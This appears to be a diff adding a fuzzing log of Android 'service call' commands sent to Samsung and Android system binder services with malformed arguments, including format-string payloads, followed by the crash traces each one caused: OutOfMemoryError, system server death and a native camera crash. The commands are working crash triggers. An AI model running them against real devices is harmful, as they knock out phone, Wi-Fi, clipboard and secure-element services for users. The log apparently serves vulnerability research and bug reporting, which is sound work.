+01-12 23:59:31.764 22749 22749 F DEBUG   :       #05 pc 00020fad  /vendor/lib/vendor.samsung.hardware.camera.device@5.0-impl.so (vendor::samsung::hardware::camera::device::V5_0::implementation::SehCameraDeviceSession::SehResultBatcher::sehInvokeProcessCaptureResultCallback(android::hardware::hidl_vec<vendor::samsung::hardware::camera::device::V5_0::SehCaptureResult>&, bool)+400) (BuildId: 4cd1280657c1d78c1fecb36e363ccb5c)
+01-12 23:59:31.764 22749 22749 F DEBUG   :       #06 pc 000200cb  /vendor/lib/vendor.samsung.hardware.camera.device@5.0-impl.so (vendor::samsung::hardware::camera::device::V5_0::implementation::SehCameraDeviceSession::SehResultBatcher::sehProcessOneCaptureResult(vendor::samsung::hardware::camera::device::V5_0::SehCaptureResult&)+90) (BuildId: 4cd1280657c1d78c1fecb36e363ccb5c)
+01-12 23:59:31.765 22749 22749 F DEBUG   :       #07 pc 0001f561  /vendor/lib/vendor.samsung.hardware.camera.device@5.0-impl.so (vendor::samsung::hardware::camera::device::V5_0::implementation::SehCameraDeviceSession::SehResultBatcher::sehProcessCaptureResult(vendor::samsung::hardware::camera::device::V5_0::SehCaptureResult&)+108) (BuildId: 4cd1280657c1d78c1fecb36e363ccb5c)
+01-12 23:59:31.766 22749 22749 F DEBUG   :       #08 pc 0001b8c1  /vendor/lib/vendor.samsung.hardware.camera.device@5.0-impl.so (vendor::samsung::hardware::camera::device::V5_0::implementation::SehCameraDeviceSession::sSehProcessCaptureResult(camera3_callback_ops const*, camera3_capture_result const*)+720) (BuildId: 4cd1280657c1d78c1fecb36e363ccb5c)
+01-12 23:59:31.766 22749 22749 F DEBUG   :       #09 pc 000de251  /vendor/lib/libexynoscamera3.so (android::ExynosCameraRequestManager::m_callbackOpsCaptureResult(camera3_capture_result*, android::EXYNOS_REQUEST_RESULT::TYPE)+68) (BuildId: 9f59bb4f87448493272629beaa72b4b4)
+01-12 23:59:31.767 22749 22749 F DEBUG   :       #10 pc 000de08b  /vendor/lib/libexynoscamera3.so (android::ExynosCameraRequestManager::m_sendCallbackResult(android::sp<android::ExynosCameraRequest>, android::sp<android::ExynosCameraRequestResult>)+366) (BuildId: 9f59bb4f87448493272629beaa72b4b4)
+01-12 23:59:31.767 22749 22749 F DEBUG   :       #11 pc 000d9a4b  /vendor/lib/libexynoscamera3.so (android::ExynosCameraRequestManager::m_resultCallbackThreadFunc()+326) (BuildId: 9f59bb4f87448493272629beaa72b4b4)
+01-12 23:59:31.768 22749 22749 F DEBUG   :       #12 pc 000a1f1b  /vendor/lib/libexynoscamera3.so (ExynosCameraThread<android::FrameWorker>::threadLoop()+24) (BuildId: 9f59bb4f87448493272629beaa72b4b4)
+01-12 23:59:31.770 22749 22749 F DEBUG   :       #13 pc 0000ef0d  /apex/com.android.vndk.v30/lib/libutils.so (android::Thread::_threadLoop(void*)+304) (BuildId: 4ce4bcaabdb4066bfee718e8cf6b3059)
+01-12 23:59:31.770 22749 22749 F DEBUG   :       #14 pc 0000e9cd  /apex/com.android.vndk.v30/lib/libutils.so (thread_data_t::trampoline(thread_data_t const*)+256) (BuildId: 4ce4bcaabdb4066bfee718e8cf6b3059)
+01-12 23:59:31.771 22749 22749 F DEBUG   :       #15 pc 000aaf33  /apex/com.android.runtime/lib/bionic/libc.so (__pthread_start(void*)+40) (BuildId: fef5b751123147ea65bf3f4f798c9518)
+01-12 23:59:31.771 22749 22749 F DEBUG   :       #16 pc 000642e3  /apex/com.android.runtime/lib/bionic/libc.so (__start_thread+30) (BuildId: fef5b751123147ea65bf3f4f798c9518)
+
+service call shortcut 2 i32 "4294967294" i64 "295147905179352825855"
+01-12 23:57:10.921 15145 16855 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:15145_F
+01-12 23:57:10.921 15145 16855 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 12582912 free bytes and 588MB until OOM, target footprint 66134592, growth limit 671088640
+01-12 23:57:10.921 15145 16855 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 23:57:10.921 15145 16855 E AndroidRuntime:        at android.content.pm.BaseParceledListSlice.<init>(BaseParceledListSlice.java:63)
+01-12 23:57:10.921 15145 16855 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:42)
+01-12 23:57:10.921 15145 16855 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:35)
+01-12 23:57:10.921 15145 16855 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:80)
+01-12 23:57:10.921 15145 16855 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:78)
+01-12 23:57:10.921 15145 16855 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:335)
+01-12 23:57:10.921 15145 16855 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 23:57:10.921 15145 16855 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+service call phone 104 i64 "295147905179352825854" i64 "295147905179352825855" s16 "AAAA" 
+01-12 16:16:57.193  2886  3151 E AndroidRuntime: FATAL EXCEPTION: Binder:2886_8
+01-12 16:16:57.193  2886  3151 E AndroidRuntime: Process: com.android.phone, PID: 2886
+01-12 16:16:57.193  2886  3151 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 5161767 free bytes and 187MB until OOM, target footprint 10323535, growth limit 201326592
+01-12 16:16:57.193  2886  3151 E AndroidRuntime:        at android.os.Parcel.readParcelableArray(Parcel.java:3408)
+01-12 16:16:57.193  2886  3151 E AndroidRuntime:        at android.telephony.NetworkScanRequest.<init>(NetworkScanRequest.java:224)
+01-12 16:16:57.193  2886  3151 E AndroidRuntime:        at android.telephony.NetworkScanRequest.<init>(NetworkScanRequest.java:35)
+01-12 16:16:57.193  2886  3151 E AndroidRuntime:        at android.telephony.NetworkScanRequest$1.createFromParcel(NetworkScanRequest.java:280)
+01-12 16:16:57.193  2886  3151 E AndroidRuntime:        at android.telephony.NetworkScanRequest$1.createFromParcel(NetworkScanRequest.java:277)
+01-12 16:16:57.193  2886  3151 E AndroidRuntime:        at com.android.internal.telephony.ITelephony$Stub.onTransact$requestNetworkScan$(ITelephony.java:15395)
+01-12 16:16:57.193  2886  3151 E AndroidRuntime:        at com.android.internal.telephony.ITelephony$Stub.onTransact(ITelephony.java:5057)
+01-12 16:16:57.193  2886  3151 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 16:16:57.193  2886  3151 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+service call phone 104 i64 "295147905179352825854" i64 "295147905179352825855" f "3.141592" 
+01-12 16:18:01.571  7394  7662 E AndroidRuntime: FATAL EXCEPTION: Binder:7394_8
+01-12 16:18:01.571  7394  7662 E AndroidRuntime: Process: com.android.phone, PID: 7394
+01-12 16:18:01.571  7394  7662 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 5100174 free bytes and 187MB until OOM, target footprint 10200350, growth limit 201326592
+01-12 16:18:01.571  7394  7662 E AndroidRuntime:        at android.os.Parcel.readParcelableArray(Parcel.java:3408)
+01-12 16:18:01.571  7394  7662 E AndroidRuntime:        at android.telephony.NetworkScanRequest.<init>(NetworkScanRequest.java:224)
+01-12 16:18:01.571  7394  7662 E AndroidRuntime:        at android.telephony.NetworkScanRequest.<init>(NetworkScanRequest.java:35)
+01-12 16:18:01.571  7394  7662 E AndroidRuntime:        at android.telephony.NetworkScanRequest$1.createFromParcel(NetworkScanRequest.java:280)
+01-12 16:18:01.571  7394  7662 E AndroidRuntime:        at android.telephony.NetworkScanRequest$1.createFromParcel(NetworkScanRequest.java:277)
+01-12 16:18:01.571  7394  7662 E AndroidRuntime:        at com.android.internal.telephony.ITelephony$Stub.onTransact$requestNetworkScan$(ITelephony.java:15395)
+01-12 16:18:01.571  7394  7662 E AndroidRuntime:        at com.android.internal.telephony.ITelephony$Stub.onTransact(ITelephony.java:5057)
+01-12 16:18:01.571  7394  7662 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 16:18:01.571  7394  7662 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+service call secims 36 i32 "268435455" s16 "3%%n%x%%s%s%%n1" s16 "AAAAAAAAAA" 
+01-12 16:35:10.615 32759   986 E AndroidRuntime: FATAL EXCEPTION: Binder:32759_6
+01-12 16:35:10.615 32759   986 E AndroidRuntime: Process: com.sec.imsservice, PID: 32759
+01-12 16:35:10.615 32759   986 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 1073741832 byte allocation with 4994871 free bytes and 507MB until OOM, target footprint 9989743, growth limit 536870912
+01-12 16:35:10.615 32759   986 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 16:35:10.615 32759   986 E AndroidRuntime:        at android.os.Parcel.readArrayList(Parcel.java:2769)
+01-12 16:35:10.615 32759   986 E AndroidRuntime:        at com.sec.ims.IImsService$Stub.onTransact(IImsService.java:890)
+01-12 16:35:10.615 32759   986 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 16:35:10.615 32759   986 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+service call secims 47 f "-1" f "3.141592" s16 "AAAAAAAAAA" 
+01-12 16:37:59.528 15013 15035 E AndroidRuntime: FATAL EXCEPTION: Binder:15013_3
+01-12 16:37:59.528 15013 15035 E AndroidRuntime: Process: com.sec.imsservice, PID: 15013
+01-12 16:37:59.528 15013 15035 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 4314120048 byte allocation with 4552599 free bytes and 507MB until OOM, target footprint 9105199, growth limit 536870912
+01-12 16:37:59.528 15013 15035 E AndroidRuntime:        at android.os.Parcel.createString16Array(Parcel.java:1481)
+01-12 16:37:59.528 15013 15035 E AndroidRuntime:        at android.os.Parcel.createStringArray(Parcel.java:1416)
+01-12 16:37:59.528 15013 15035 E AndroidRuntime:        at com.sec.ims.IImsService$Stub.onTransact(IImsService.java:1024)
+01-12 16:37:59.528 15013 15035 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 16:37:59.528 15013 15035 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+service call secims 95 i32 "268435455" i64 "295147905179352825855" i64 "0" 
+01-12 16:39:47.353 20734 20751 E AndroidRuntime: FATAL EXCEPTION: Binder:20734_1
+01-12 16:39:47.353 20734 20751 E AndroidRuntime: Process: com.sec.imsservice, PID: 20734
+01-12 16:39:47.353 20734 20751 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 1073741832 byte allocation with 4383078 free bytes and 507MB until OOM, target footprint 8766158, growth limit 536870912
+01-12 16:39:47.353 20734 20751 E AndroidRuntime:        at android.os.Parcel.createString16Array(Parcel.java:1481)
+01-12 16:39:47.353 20734 20751 E AndroidRuntime:        at android.os.Parcel.createStringArray(Parcel.java:1416)
+01-12 16:39:47.353 20734 20751 E AndroidRuntime:        at com.sec.ims.IImsService$Stub.onTransact(IImsService.java:1521)
+01-12 16:39:47.353 20734 20751 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 16:39:47.353 20734 20751 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+service call secure_element 3 i32 "1" i32 "65535" i64 "295147905179352825854" 
+01-12 16:42:24.830   308  1679 E AndroidRuntime: FATAL EXCEPTION: Binder:308_3
+01-12 16:42:24.830   308  1679 E AndroidRuntime: Process: com.android.se, PID: 308
+01-12 16:42:24.830   308  1679 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 1874805 free bytes and 190MB until OOM, target footprint 3749613, growth limit 201326592
+01-12 16:42:24.830   308  1679 E AndroidRuntime:        at android.os.Parcel.createString16Array(Parcel.java:1481)
+01-12 16:42:24.830   308  1679 E AndroidRuntime:        at android.os.Parcel.createStringArray(Parcel.java:1416)
+01-12 16:42:24.830   308  1679 E AndroidRuntime:        at android.se.omapi.ISecureElementService$Stub.onTransact(ISecureElementService.java:133)
+01-12 16:42:24.830   308  1679 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 16:42:24.830   308  1679 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+service call sem_wifi 104 f "3.141592" s16 "AAAAAAAAAA" s16 "AAAA" 
+01-12 16:44:39.330 32093 32464 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:32093_6
+01-12 16:44:39.330 32093 32464 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 4314120048 byte allocation with 12582912 free bytes and 590MB until OOM, target footprint 64862904, growth limit 671088640
+01-12 16:44:39.330 32093 32464 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 16:44:39.330 32093 32464 E AndroidRuntime:        at android.os.Parcel.createStringArrayList(Parcel.java:2967)
+01-12 16:44:39.330 32093 32464 E AndroidRuntime:        at com.samsung.android.wifi.ISemWifiManager$Stub.onTransact(ISemWifiManager.java:2244)
+01-12 16:44:39.330 32093 32464 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 16:44:39.330 32093 32464 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-12 16:44:39.524 24315 24315 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 16:44:39.524 24315 24315 E AndroidRuntime: Process: com.samsung.android.mcfserver, PID: 24315
+01-12 16:44:39.524 24315 24315 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root caus
+
+service call semclipboard 17 i64 "295147905179352825854" f "-1" f "3.141592" 
+01-12 16:49:20.495 30087 31899 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:30087_14
+01-12 16:49:20.495 30087 31899 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 4314120048 byte allocation with 12582912 free bytes and 589MB until OOM, target footprint 65231272, growth limit 671088640
+01-12 16:49:20.495 30087 31899 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 16:49:20.495 30087 31899 E AndroidRuntime:        at android.os.Parcel.createStringArrayList(Parcel.java:2967)
+01-12 16:49:20.495 30087 31899 E AndroidRuntime:        at android.content.ClipDescription.<init>(ClipDescription.java:388)
+01-12 16:49:20.495 30087 31899 E AndroidRuntime:        at android.content.ClipData.<init>(ClipData.java:1156)
+01-12 16:49:20.495 30087 31899 E AndroidRuntime:        at android.content.ClipData$1.createFromParcel(ClipData.java:1178)
+01-12 16:49:20.495 30087 31899 E AndroidRuntime:        at android.content.ClipData$1.createFromParcel(ClipData.java:1174)
+01-12 16:49:20.495 30087 31899 E AndroidRuntime:        at android.sec.clipboard.IClipboardService$Stub.onTransact(IClipboardService.java:533)
+01-12 16:49:20.495 30087 31899 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 16:49:20.495 30087 31899 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-12 16:49:20.827 31955  8942 E AndroidRuntime: FATAL EXCEPTION: highpool[7]
+01-12 16:49:20.827 31955  8942 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 31955
+01-12 16:49:20.827 31955  8942 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 16:49:20.845 31955 31955 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 16:49:20.845 31955 31955 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 31955
+01-12 16:49:20.845 31955 31955 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 16:49:20.961 31757 31757 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 16:49:20.961 31757 31757 E AndroidRuntime: Process: com.google.android.googlequicksearchbox:interactor, PID: 31757
+01-12 16:49:20.961 31757 31757 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root caus
+
+service call shortcut 1 i32 "1" i64 "295147905179352825854" f "3.141592" 
+01-12 17:09:51.895  6039  8833 E AndroidRuntime: !à*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:6039_1D
+01-12 17:09:51.895  6039  8833 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 4314120048 byte allocation with 12582912 free bytes and 587MB until OOM, target footprint 67988872, growth limit 671088640
+01-12 17:09:51.895  6039  8833 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 17:09:51.895  6039  8833 E AndroidRuntime:        at android.content.pm.BaseParceledListSlice.<init>(BaseParceledListSlice.java:63)
+01-12 17:09:51.895  6039  8833 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:42)
+01-12 17:09:51.895  6039  8833 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:35)
+01-12 17:09:51.895  6039  8833 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:80)
+01-12 17:09:51.895  6039  8833 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:78)
+01-12 17:09:51.895  6039  8833 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:316)
+01-12 17:09:51.895  6039  8833 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 17:09:51.895  6039  8833 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+service call shortcut 22 i64 "1" f "3.141592" s16 "3%%n%x%%s%s%%n1" 
+01-12 17:12:33.746 30794 32734 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:30794_17
+01-12 17:12:33.746 30794 32734 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 4314120048 byte allocation with 12582912 free bytes and 590MB until OOM, target footprint 64475912, growth limit 671088640
+01-12 17:12:33.746 30794 32734 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 17:12:33.746 30794 32734 E AndroidRuntime:        at android.os.Parcel.readArrayList(Parcel.java:2769)
+01-12 17:12:33.746 30794 32734 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:637)
+01-12 17:12:33.746 30794 32734 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 17:12:33.746 30794 32734 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-12 17:12:34.166 32577 32577 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 17:12:34.166 32577 32577 E AndroidRuntime: Process: com.google.android.googlequicksearchbox:interactor, PID: 32577
+01-12 17:12:34.166 32577 32577 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+
+service call shortcut 20 i32 "4294967294" i64 "295147905179352825855" i64 "0"
+01-12 17:13:42.680  3062  5087 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:3062_15
+01-12 17:13:42.680  3062  5087 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 420546432 byte allocation with 12582912 free bytes and 322MB until OOM, target footprint 345243960, growth limit 671088640
+01-12 17:13:42.680  3062  5087 E AndroidRuntime:        at java.util.Arrays.copyOf(Arrays.java:3136)
+01-12 17:13:42.680  3062  5087 E AndroidRuntime:        at java.util.Arrays.copyOf(Arrays.java:3106)
+01-12 17:13:42.680  3062  5087 E AndroidRuntime:        at java.util.ArrayList.grow(ArrayList.java:275)
+01-12 17:13:42.680  3062  5087 E AndroidRuntime:        at java.util.ArrayList.ensureExplicitCapacity(ArrayList.java:249)
+01-12 17:13:42.680  3062  5087 E AndroidRuntime:        at java.util.ArrayList.ensureCapacityInternal(ArrayList.java:241)
+01-12 17:13:42.680  3062  5087 E AndroidRuntime:        at java.util.ArrayList.add(ArrayList.java:467)
+01-12 17:13:42.680  3062  5087 E AndroidRuntime:        at android.os.Parcel.readStringList(Parcel.java:3014)
+01-12 17:13:42.680  3062  5087 E AndroidRuntime:        at android.content.IntentFilter.<init>(IntentFilter.java:2368)
+01-12 17:13:42.680  3062  5087 E AndroidRuntime:        at android.content.IntentFilter$1.createFromParcel(IntentFilter.java:2260)
+01-12 17:13:42.680  3062  5087 E AndroidRuntime:        at android.content.IntentFilter$1.createFromParcel(IntentFilter.java:2258)
+01-12 17:13:42.680  3062  5087 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:598)
+01-12 17:13:42.680  3062  5087 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 17:13:42.680  3062  5087 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-12 17:13:43.259  4659  4784 E AndroidRuntime: FATAL EXCEPTION: NmsServiceStub
+01-12 17:13:43.259  4659  4784 E AndroidRuntime: Process: com.samsung.android.mdecservice, PID: 4659
+
+service call shortcut 3 i32 "4294967294" i32 "268435455" 
+01-12 17:17:16.334  4236  6209 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:4236_14
+01-12 17:17:16.334  4236  6209 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 1073741832 byte allocation with 12582912 free bytes and 590MB until OOM, target footprint 64286104, growth limit 671088640
+01-12 17:17:16.334  4236  6209 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 17:17:16.334  4236  6209 E AndroidRuntime:        at android.os.Parcel.readArrayList(Parcel.java:2769)
+01-12 17:17:16.334  4236  6209 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:354)
+01-12 17:17:16.334  4236  6209 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 17:17:16.334  4236  6209 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-12 17:17:16.740 14814 14890 E AndroidRuntime: FATAL EXCEPTION: message-t-3
+01-12 17:17:16.740 14814 14890 E AndroidRuntime: Process: com.samsung.android.messaging, PID: 14814
+01-12 17:17:16.740 14814 14890 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 17:17:16.748 15385 15469 E AndroidRuntime: FATAL EXCEPTION: Thread-5
+01-12 17:17:16.748 15385 15469 E AndroidRuntime: Process: com.samsung.android.calendar, PID: 15385
+
+service call shortcut 5 i32 "0" i32 "65535" i64 "295147905179352825854" 
+01-12 17:19:37.934 15818 17527 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 12582912 free bytes and 589MB until OOM, target footprint 65362352, growth limit 671088640
+01-12 17:19:37.934 15818 17527 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 17:19:37.934 15818 17527 E AndroidRuntime:        at android.content.pm.BaseParceledListSlice.<init>(BaseParceledListSlice.java:63)
+01-12 17:19:37.934 15818 17527 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:42)
+01-12 17:19:37.934 15818 17527 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:35)
+01-12 17:19:37.934 15818 17527 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:80)
+01-12 17:19:37.934 15818 17527 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:78)
+01-12 17:19:37.934 15818 17527 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:379)
+01-12 17:19:37.934 15818 17527 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 17:19:37.934 15818 17527 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-12 17:19:38.285 18102 18102 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 17:19:38.285 18102 18102 E AndroidRuntime: Process: com.google.android.googlequicksearchbox:search, PID: 18102
+
+service call shortcut 5 i32 "268435455" i64 "295147905179352825855" i64 "0" 
+01-12 17:21:11.638 26797 27514 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:26797_F
+01-12 17:21:11.638 26797 27514 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 12582912 free bytes and 589MB until OOM, target footprint 65495544, growth limit 671088640
+01-12 17:21:11.638 26797 27514 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 17:21:11.638 26797 27514 E AndroidRuntime:        at android.content.pm.BaseParceledListSlice.<init>(BaseParceledListSlice.java:63)
+01-12 17:21:11.638 26797 27514 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:42)
+01-12 17:21:11.638 26797 27514 E AndroidRuntime:        at android.content.pm.ParceledListSlice.<init>(ParceledListSlice.java:35)
+01-12 17:21:11.638 26797 27514 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:80)
+01-12 17:21:11.638 26797 27514 E AndroidRuntime:        at android.content.pm.ParceledListSlice$1.createFromParcel(ParceledListSlice.java:78)
+01-12 17:21:11.638 26797 27514 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:379)
+01-12 17:21:11.638 26797 27514 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 17:21:11.638 26797 27514 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-12 17:21:12.059  2349  2349 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 17:21:12.059  2349  2349 E AndroidRuntime: PID: 2349
+01-12 17:21:12.059  2349  2349 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 17:21:12.088 28261 28696 E AndroidRuntime: FATAL EXCEPTION: NmsServiceStub
+01-12 17:21:12.088 28261 28696 E AndroidRuntime: Process: com.samsung.android.mdecservice, PID: 28261
+
+service call shortcut 8 i32 "0" i64 "295147905179352825855" s16 "ÿÿfÿÿÿÿÿü" 
+01-12 17:23:16.353  2707  2721 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:2707_2
+01-12 17:23:16.353  2707  2721 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 12582912 free bytes and 589MB until OOM, target footprint 65168304, growth limit 671088640
+01-12 17:23:16.353  2707  2721 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 17:23:16.353  2707  2721 E AndroidRuntime:        at android.os.Parcel.readArrayList(Parcel.java:2769)
+01-12 17:23:16.353  2707  2721 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:449)
+01-12 17:23:16.353  2707  2721 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 17:23:16.353  2707  2721 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-12 17:23:16.713  4037  4195 E AndroidRuntime: FATAL EXCEPTION: BluetoothScanManager
+01-12 17:23:16.713  4037  4195 E AndroidRuntime: Process: com.android.bluetooth, PID: 4037
+01-12 17:23:16.713  4037  4195 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 17:23:16.746  4994 12401 E AndroidRuntime: FATAL EXCEPTION: [com.google.android.gms.chimera.container.intentoperation.GmsIntentOperationChimeraService-Executor] idle
+
+service call shortcut 8 i32 "0" i64 "295147905179352825854" i64 "0" 
+01-12 17:24:20.459 12756 14435 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:12756_D
+01-12 17:24:20.459 12756 14435 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 12582912 free bytes and 589MB until OOM, target footprint 66057352, growth limit 671088640
+01-12 17:24:20.459 12756 14435 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 17:24:20.459 12756 14435 E AndroidRuntime:        at android.os.Parcel.readArrayList(Parcel.java:2769)
+01-12 17:24:20.459 12756 14435 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:449)
+01-12 17:24:20.459 12756 14435 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 17:24:20.459 12756 14435 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-12 17:24:20.946 14539 15474 E AndroidRuntime: FATAL EXCEPTION: highpool[3]
+01-12 17:24:20.946 14539 15474 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 14539
+01-12 17:24:20.946 14539 15474 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root caus
+
+service call shortcut 9 i64 "295147905179352825855" s16 "AAAAAAAAAA" s16 "AAAA" 
+01-12 17:28:15.915 18440 18528 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:18440_3
+01-12 17:28:15.915 18440 18528 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 12582912 free bytes and 587MB until OOM, target footprint 67498608, growth limit 671088640
+01-12 17:28:15.915 18440 18528 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
